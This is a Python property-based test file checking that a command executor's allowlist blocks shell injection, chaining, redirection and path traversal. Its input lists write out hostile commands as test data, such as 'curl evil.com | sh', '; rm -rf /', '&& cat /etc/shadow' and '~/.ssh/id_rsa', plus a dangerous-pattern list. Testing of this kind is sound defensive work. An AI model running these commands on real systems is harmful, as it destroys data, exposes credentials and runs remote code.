"""
Property-Based Tests for SafeCommandExecutor using Hypothesis.

These tests explore edge cases automatically by generating random inputs.
Based on Anthropic's security testing standards.

Tests:
- Fuzzing command inputs
- Boundary conditions
- Unicode and special characters
- Shell injection resistance
"""
import pytest
from hypothesis import given, strategies as st, settings

from jdev_tui.core.safe_executor import (
    SafeCommandExecutor,
    AllowedCommand,
    SafeExecutionResult,
    CommandCategory,
)


# =============================================================================
# STRATEGY DEFINITIONS
# =============================================================================

# Strategy for valid command prefixes
valid_commands = st.sampled_from([
    "pytest", "ruff check", "ruff format", "python -m pytest",
    "git status", "git log", "git diff", "git branch",
    "ls", "pwd", "cat", "echo", "tree"
])

# Strategy for dangerous patterns
dangerous_patterns = st.sampled_from([
    "rm ", "sudo ", "chmod ", "chown ", ";", "&&", "||",
    "|", "$(", "`", "${", ">", ">>", "<", "eval ", "exec ",
    "\n", "\\n", "| sh", "| bash"
])

# Strategy for safe argument characters
safe_chars = st.sampled_from(
    list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-./")
)

safe_args = st.text(alphabet=safe_chars, min_size=0, max_size=100)

# Strategy for potentially malicious inputs
malicious_inputs = st.one_of(
    # Shell injection attempts
    st.just("$(whoami)"),
    st.just("`id`"),
    st.just("${IFS}cat${IFS}/etc/passwd"),
    # Command chaining
    st.just("; rm -rf /"),
    st.just("&& cat /etc/shadow"),
    st.just("|| curl evil.com"),
    # Path traversal
    st.just("../../../etc/passwd"),
    st.just("/etc/passwd"),
    st.just("~/.ssh/id_rsa"),
    # Unicode tricks
    st.just("\u202e\u202d"),  # RTL/LTR override
    st.just("\x00"),  # Null byte
    # Long strings (reduced size for Hypothesis limits)
    st.text(min_size=1000, max_size=5000),
)


# =============================================================================
# PROPERTY TESTS - COMMAND VALIDATION
# =============================================================================

class TestPropertyBasedValidation:
    """Property-based tests for command validation."""

    @pytest.fixture
    def executor(self):
        return SafeCommandExecutor()

    @given(command=st.text(min_size=0, max_size=1000))
    @settings(max_examples=200)
    def test_validation_never_crashes(self, command):
        """Property: validation should never crash, regardless of input."""
        executor = SafeCommandExecutor()

        # Should not raise any exception
        allowed, reason = executor.is_command_allowed(command)

        assert isinstance(allowed, bool)
        assert isinstance(reason, str)

    @given(prefix=valid_commands, args=safe_args)
    @settings(max_examples=100)
    def test_valid_commands_with_safe_args_never_crash(self, prefix, args):
        """Property: valid commands with safe args should never crash."""
        executor = SafeCommandExecutor()
        command = f"{prefix} {args}".strip()

        # Should never crash
        allowed, reason = executor.is_command_allowed(command)

        # Result should always be a boolean and reason a string
        assert isinstance(allowed, bool)
        assert isinstance(reason, str)
        # Reason always has content (either description when allowed or error when blocked)
        assert len(reason) > 0 or allowed

    @given(dangerous=dangerous_patterns, suffix=st.text(max_size=50))
    @settings(max_examples=200)
    def test_dangerous_patterns_always_blocked(self, dangerous, suffix):
        """Property: any command containing dangerous patterns should be blocked."""
        executor = SafeCommandExecutor()

        # Create command that starts valid but contains dangerous pattern
        command = f"echo {dangerous}{suffix}"

        allowed, reason = executor.is_command_allowed(command)

        # Should be blocked due to dangerous pattern
        assert allowed is False, f"Command '{command}' should be blocked"

    @given(malicious=malicious_inputs)
    @settings(max_examples=100)
    def test_malicious_inputs_always_blocked(self, malicious):
        """Property: known malicious inputs should always be blocked."""
        executor = SafeCommandExecutor()

        allowed, reason = executor.is_command_allowed(malicious)

        # Should be blocked
        assert allowed is False, f"Malicious input '{malicious[:50]}...' should be blocked"

    @given(command=st.text())
    @settings(max_examples=100)
    def test_empty_and_whitespace_handled(self, command):
        """Property: empty/whitespace commands handled gracefully."""
        executor = SafeCommandExecutor()

        if command.strip() == "":
            allowed, reason = executor.is_command_allowed(command)
            # Empty commands should be blocked or handled gracefully
            assert isinstance(allowed, bool)


# =============================================================================
# PROPERTY TESTS - SHELL INJECTION RESISTANCE
# =============================================================================

class TestShellInjectionResistance:
    """Property-based tests specifically for shell injection resistance."""

    @given(
        payload=st.one_of(
            st.just("$(cat /etc/passwd)"),
            st.just("`rm -rf /`"),
            st.just("${HOME}"),
            st.just("$((`whoami`))"),
        ),
        prefix=st.sampled_from(["", " ", "test ", "file_"]),
        suffix=st.sampled_from(["", " ", ".txt", "_backup"]),
    )
    @settings(max_examples=50)
    def test_command_substitution_blocked(self, payload, prefix, suffix):
        """Property: command substitution is always blocked."""
        executor = SafeCommandExecutor()
        command = f"echo {prefix}{payload}{suffix}"

        allowed, reason = executor.is_command_allowed(command)

        assert allowed is False, f"Command substitution should be blocked: {command}"

    @given(
        separator=st.sampled_from([";", "&&", "||"]),
        second_cmd=st.sampled_from(["rm -rf /", "cat /etc/passwd", "curl evil.com | sh"]),
    )
    @settings(max_examples=30)
    def test_command_chaining_blocked(self, separator, second_cmd):
        """Property: command chaining is always blocked."""
        executor = SafeCommandExecutor()
        command = f"echo hello {separator} {second_cmd}"

        allowed, reason = executor.is_command_allowed(command)

        assert allowed is False, f"Command chaining should be blocked: {command}"

    @given(
        redirect=st.sampled_from([">", ">>", "<", "2>", "&>"]),
        target=st.sampled_from(["/etc/passwd", "/dev/sda", "~/.bashrc"]),
    )
    @settings(max_examples=30)
    def test_redirection_blocked(self, redirect, target):
        """Property: file redirection is blocked for sensitive paths."""
        executor = SafeCommandExecutor()
        command = f"echo hack {redirect} {target}"

        allowed, reason = executor.is_command_allowed(command)

        # Should be blocked
        assert allowed is False, f"Redirection should be blocked: {command}"


# =============================================================================
# PROPERTY TESTS - UNICODE AND ENCODING
# =============================================================================

class TestUnicodeHandling:
    """Property-based tests for unicode and encoding edge cases."""

    @given(unicode_text=st.text(alphabet=st.characters(
        whitelist_categories=('Lu', 'Ll', 'Nd', 'Zs'),
        blacklist_characters='\x00'
    ), min_size=0, max_size=100))
    @settings(max_examples=100)
    def test_unicode_commands_handled(self, unicode_text):
        """Property: unicode text is handled without crashes."""
        executor = SafeCommandExecutor()
        command = f"echo {unicode_text}"

        # Should not crash
        allowed, reason = executor.is_command_allowed(command)
        assert isinstance(allowed, bool)

    @given(n=st.integers(min_value=0, max_value=255))
    @settings(max_examples=50)
    def test_control_characters_handled(self, n):
        """Property: control characters don't cause crashes."""
        executor = SafeCommandExecutor()
        char = chr(n)
        command = f"echo test{char}string"

        # Should not crash
        allowed, reason = executor.is_command_allowed(command)
        assert isinstance(allowed, bool)

        # Control characters should likely be blocked or sanitized
        if n < 32 and n not in (9, 10, 13):  # Tab, LF, CR are sometimes ok
            # Most control chars should make command invalid
            pass  # Just verify no crash


# =============================================================================
# PROPERTY TESTS - BOUNDARY CONDITIONS
# =============================================================================

class TestBoundaryConditions:
    """Property-based tests for boundary conditions."""

    @given(length=st.integers(min_value=0, max_value=100000))
    @settings(max_examples=20, deadline=10000)  # Longer deadline for big strings
    def test_long_commands_handled(self, length):
        """Property: very long commands are handled gracefully."""
        executor = SafeCommandExecutor()
        command = "echo " + "a" * length

        # Should not crash or hang
        allowed, reason = executor.is_command_allowed(command)
        assert isinstance(allowed, bool)

    @given(depth=st.integers(min_value=1, max_value=100))
    @settings(max_examples=20)
    def test_deeply_nested_substitution_blocked(self, depth):
        """Property: deeply nested command substitution is blocked."""
        executor = SafeCommandExecutor()

        # Create nested command substitution
        inner = "whoami"
        for _ in range(depth):
            inner = f"$({inner})"

        command = f"echo {inner}"

        allowed, reason = executor.is_command_allowed(command)
        assert allowed is False, "Nested substitution should be blocked"


# =============================================================================
# PROPERTY TESTS - ALLOWED COMMANDS STRUCTURE
# =============================================================================

class TestAllowedCommandsStructure:
    """Property-based tests for AllowedCommand dataclass."""

    @given(
        name=st.text(min_size=1, max_size=50),
        base_command=st.text(min_size=1, max_size=50),
        description=st.text(min_size=0, max_size=200),
        timeout=st.integers(min_value=1, max_value=600),
    )
    @settings(max_examples=50)
    def test_allowed_command_creation(self, name, base_command, description, timeout):
        """Property: AllowedCommand can be created with various inputs."""
        allowed = AllowedCommand(
            name=name,
            base_command=base_command,
            allowed_args=frozenset(["-v", "--help"]),
            category=CommandCategory.TESTING,
            timeout_seconds=timeout,
            description=description,
        )

        assert allowed.name == name
        assert allowed.base_command == base_command
        assert allowed.description == description
        assert allowed.timeout_seconds == timeout

    @given(category=st.sampled_from(list(CommandCategory)))
    @settings(max_examples=20)
    def test_all_categories_valid(self, category):
        """Property: all CommandCategory values can be used."""
        allowed = AllowedCommand(
            name="test",
            base_command="test",
            allowed_args=frozenset(),
            category=category,
            description="Test",
        )

        assert allowed.category == category


# =============================================================================
# PROPERTY TESTS - EXECUTION RESULT
# =============================================================================

class TestExecutionResultProperties:
    """Property-based tests for ExecutionResult dataclass."""

    @given(
        success=st.booleans(),
        exit_code=st.integers(min_value=-128, max_value=128),
        stdout=st.text(max_size=5000),
        stderr=st.text(max_size=5000),
        command=st.text(min_size=1, max_size=100),
    )
    @settings(max_examples=50)
    def test_execution_result_creation(self, success, exit_code, stdout, stderr, command):
        """Property: ExecutionResult handles various inputs."""
        result = SafeExecutionResult(
            success=success,
            exit_code=exit_code,
            stdout=stdout,
            stderr=stderr,
            command=command,
        )

        assert result.success == success
        assert result.exit_code == exit_code
        assert result.stdout == stdout
        assert result.stderr == stderr
        assert result.command == command


# =============================================================================
# INVARIANT TESTS
# =============================================================================

class TestInvariants:
    """Tests for system invariants that should always hold."""

    @given(command=st.text(min_size=0, max_size=1000))
    @settings(max_examples=100)
    def test_rejection_reason_non_empty_when_blocked(self, command):
        """Invariant: blocked commands always have a non-empty reason."""
        executor = SafeCommandExecutor()

        allowed, reason = executor.is_command_allowed(command)

        if not allowed:
            assert len(reason) > 0, f"Blocked command should have reason: {command[:50]}"

    @given(command=st.text(min_size=0, max_size=1000))
    @settings(max_examples=100)
    def test_reason_always_string(self, command):
        """Invariant: reason is always a string."""
        executor = SafeCommandExecutor()

        allowed, reason = executor.is_command_allowed(command)

        assert isinstance(reason, str), f"Reason should be string: {type(reason)}"

    @given(st.data())
    @settings(max_examples=20)
    def test_executor_stateless(self, data):
        """Invariant: executor is stateless - same input gives same output."""
        executor = SafeCommandExecutor()
        command = data.draw(st.text(min_size=0, max_size=100))

        result1 = executor.is_command_allowed(command)
        result2 = executor.is_command_allowed(command)

        assert result1 == result2, "Executor should be stateless"
